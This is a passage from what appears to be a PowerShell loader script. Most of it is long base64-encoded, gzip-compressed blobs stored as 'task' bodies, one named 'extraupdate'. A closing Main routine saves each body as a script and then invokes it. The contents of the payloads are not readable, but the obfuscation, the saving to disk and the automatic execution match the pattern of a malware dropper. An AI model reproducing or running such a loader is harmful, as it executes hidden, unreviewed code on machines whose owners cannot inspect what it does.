eMTko5+bRzc29up+arJnAaccZ9Nh9+STflxCLdDAj2k5UFrwrMCj0eAhw6zAC2UcI5qgdK+SYszZNSzxrJ2RTGSKz9h79fkDl0jDcPu2Yd/PJfqSs0CP0xtRaIYpDPRJwKPrp4HC1XyRTW1ow2YZE5q6Scxu2dz5Up2F58pgR/pJKLjeX8Ooj+qx5ZfJPK+KWQf1yLC9kYzl5q4A1iB5vllHMPdhAns4f8/lIHMf64CUo2dszlRcOafiQCGZBbY+KGS7A4W0+DR5HJLNO6gy3utCRa8nH3YLn2tWJuVmnoEv6v6qG1mIUTag50bU0Da7W5lGG0/Gg15tW4giqETEUE8Pwm1LJz+t4exA7Wft2ahUW0EUEjj3RY3mcwSfW6t3DUiYpy0FqzerJpqykyYDI5XfMsBJ8bVLYYPsK5G1Wrg+e+NEe3uxnXuT+EurN+1Yjazt+v3I0e9WV846chZC5i4YVXVgqpElEFecLZNGXGuElPmN17GwdCT2sqzSJsZbda8rBbDrth3DNbhBK3Qe8wfDU1Z9ra9NSJyxulCtIECGB9obuJpG3YwA3fzNhe5Np9lLoSZ7FCnNmxnfWyC1yton1wGY9oyVEFhISs0j1BaDH9OnkbVPon0Q9ZV7DZcRgZIy7MgvVuqCJsS7UVwEV5pG0t7kOOunH2OkNcrhcSMN8NV+RL4zgxghQdT+jBZmIbam6xrUUxY+fXglYyEZmh66GJGRVhbb3utO4Hp/e4f9y6qNecMPx6dQbmv2PslUls3b1Z3OlEchoAN5mtqy7sx47cOG5XYqQ+uq0dPCMx8WwnLa0xut5wl78l1zyG5Ttj6w6ITWVosNLT2qoejzcL3mZuntF5k2ItYbmpOMgDfRSVGuk/PGzQdluNyhO6qu6lvhOWfPX9QrwXTeKxd0iHzP7ppY7rInmLZkcOsOhpcS+vRuU7442ikn3SW344Jyc27sAGvOqSHVQaAEnPEzErhTFMK09C5isY8LHPELAjoJYcHOvgs1kC0LoA5vm2wIr5fBp4fUDa45XwDaplTbBzvWLGQ7tklNjyZ1pIVfasjVPtyysYXT0dMO+VNqzlNHEHhI3Z2kldzW4nhz5t0Ym4FwkpfmsVVd3r2BW6rEXnpFBpGHGpnEMs09Y3Nl9UGhmW5hDWsSDMQ/SqvygK1K8WCIeXdlwrhBdKnUnxcvk1NVOhNr6oBmK+xbsUr/pXjCBROqI7A2p3uvlci1EJ7mu3Pg2cfAuOhZN0k+sYsPImJ/kjOShwqjRnWub2KOLgkiBdas7nrRdaWPhc3Lty4qj4jTYsbQUwB010/2ZkYiloSWXXfc4jq9Enp1Kua2Q1u+QKiDy9KiOOoI4D4uHlom1KFMkPqhUlM6IszXcgMz07iSm05ox/pex4kWMO9oZKUQ1HlFHEFQ+dHqTEc/2KkhVvd+Pi/5KO6XIAW1evgagcBdObqweYie+lJBb23norh8MG2jKNrWJlS3IJ42/InBbpxI4ciHu+eTIn5ba4+vgTD1LuBUb0HZo+kNbThnH1Wa+zn5ltnZZwqLNlOLZujYp241uFpvfu3veLarQHADLeNOM/IkdHWnMN4XO1W97hQ1LTvAl9szpFglsB9DdJZ3uCWIToTPyV0tusypr47BLzKAKUF+LdsruBMRlLumkhE+iNsSQGnFpIP8aXnbsgCiglsH4zgGGlgJLeuQ2fFdjlwHKketlNXIviPlDrJhDRO8ePQtju+gOChsJJHy0xr2oafTQDky9QhYxpHaq35fbFt8MHadnXfVHxaVDbOUReixUpjjXHE4Ng7UW90H6AlZyJlTUBjG07KYeM3ICB0BWRhUabSd7rdhFpLGB+LnJcm4MmUe4S2rKF8eUk2bR7Nvmf4wsTDM6+oyJIVuUhvyVP6gwO5PE81u8CLgS4CQ4iC+MwOv/W0hY//qAuXkdsAGmI/oE+JcFoNf7AqI4jeLdbTXwQVk+NTrZHYMmNXSJ/LREm0yhPolRZegzBsns6N3odyi5IlY5+RSjYaspQ5bvNoMleamICDVKd1t6xSiyhRPN+L0e6ouuxS7lKiQ19jOwJbYQpUaEsmbIeGb1e50ZulaxBJkXLkiSoOa3ri9CljIw9NV8Id5Fc6h0i427Yl9aPTbA11tZp1orxwwbZZt4oPBP8JXhF+lCdmvscxrNp/dSdylV30bclSJN8NjO9lX4oQUkFV7GA6+X/FoDJjZdhv0yUAAyNm+VgS17jQCl4VXfuc2rLa1tl+zNXgHG0bnY+kkEpp790abiouIZskLDqcASQPJ6WYQsQXfYwMOH+uh5JiNClxSRVtU61dhBfdh6kkn6hwsl2sRNNtSwNTkopREptl69fHbJrMDogSJ58uPhwJ2ONmPJuIBXqsC8Dn0JQyEK/OCLF5m0tY1hKBmYqeHOLDoU5I67nMJihFSd5BDPeKWc6GkIhek9Qszq3Q40Iidl+eU9Px0WcxxKuq1nimIPGLFzYE8zS72rsE0DGWvJJvbIpWktLQkn+/IRq/G5NhUYmDLJjGhfGN+OR2mgK2TWaT8OKwcGWztpzwGWyDMvtqkcqeNUvJj4HVa/bve1AgXJkUf6iwO3t4TYeU+odP8UdKXGbcbDTwIsDKPNHmNo6YrMj5ASmE2lCmB2RREG1QiLgqNCIgzZDXVjR2k9p7BgmJA2F8BDy4+vkP3J0xlI2oVG0mqbnEuq72VMDB52KN18yxEJOofLCiIRaBuEqOGGZeTOkXu+qp1C4ppJe27NFpHM5m+A2R47d1wnY0Ik1MHg7fZ7bACZpUTqBTTMMbBdN49ywLkTeKx68g+VPdm8qobbl6ewAgp12AW1ZE2y4zIKyT90No9EVyMnF5goE4tx8+utwiFppccknAR+YG1yd5YdUlbbpGf1ov/BPIDUbOWz7CoeIfoN0kU79lNTGC1V/EOS5I19x3xid7F2h3Mktttsof3kcxGhGr00ye4QUBbSWWLbdBN+sHKtjmswohgyVG4eReyHU9WpETwq0kFij9TAI1KYaK3YN46Cp0RmE1QPRLgZkBIwyn0OSc3QBqYSe8GbwesZVXRmQFp1g26YYf16EIxi9U6UmHcCqlGlwb4+dFHBe6ynHtPO1XIadkVw4tGzGgTyvbYabnQqXqKPqKnAqLNdUPAwgw0qurqTojgocoJt3FHvLtW06R8bOXaEsj2s1/VEIvlAwEmJSFHkN0uztA0/dc//fjDT6Gldql2LLbTLmYQu+I23cPXX7/+kx2HI1+2v/36q7CMPROvOYHZ21IP5c8//Zev3X/+8Ycff/gpC2pW44v7lI3zKAuP8d/Gznz99eudn38xkiZPty/7Xre8/0U2ftHzflxue1vyuP/5P75fxJ9//OEnJ9jXoy+kxO6sgFm4/d8BsmM/Lfm61uPwi/jU0x/Q/6as//j6z++H/stYH7P8b7/+yuXpH3O/85T3JEmdtls7c3fK4bTm/x+O36PyCztOtzP+/B3IPyRVGlG5T99wVTFsTaZWLGH9+uvXdwJ+cUZ6WeL752+inaa3sack9HdEN7MwM313eO23nv5RnJNf2y+/9bAeyr/9+qvrCNQvYr79o73fTfx7TTFza0LoF5I+nfFxbMl32f+W4Hc0Zq+7LF9+/OE/j7HO/vbfAX6hpykfsp//Tdm/p+3q00/0pl+c8/AGVTgF55sQ/x3MGf8g8Vvcjz8U+5Bu9Th8FaXCZD4nLGXjtHmtGP+r+PrfP/7w9fX19dPKhld4Baz/bIxYzBb/7QcO++v/zPJkL3/Zru1Pvzv+/tyW+x+R3+x/fLFVnrZfdfG1VflXUXf5V37V67b+06cuvn528nX7ixlv1ffy/bbg3FP+peVx8ed/xf9mS77ty/D107bs+T9X/v6Vd2v+73yLuFv/1fn34d+/0nhLq/+HwG9T8XB/5csyLuvXVsXb15im+/KV7d/k/I3aPxmMU77E32T9J8p30v79xx/+/q0H39h/R/4///jDH1Vsy/374F+q+uk+2sQvJdsZrKANxLs92+LbJv6/jflLlv92C/0yrfAfDfpm/3Kyhbr7doT9pd5yuuu+7cqfv4/7H1/f22J//odmv79/V+6/VPoPij/+IA/H2OZ/4a9/3B/fRfzm+X8AYtFtACwcAAA="
    "extraupdate" = "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"

        }

        writedbg "Main - "
        foreach ($key in $tasks.Keys)
        {
            $task = $key
            $body = $tasks.$key
            writedbg "Main - $task"
            Save-Script -taskName $task -Body $body
            Invoke-Script -taskName $task
        }
    }
}

Main

if ($globalDebug)
{
    Start-Sleep -Seconds 100
}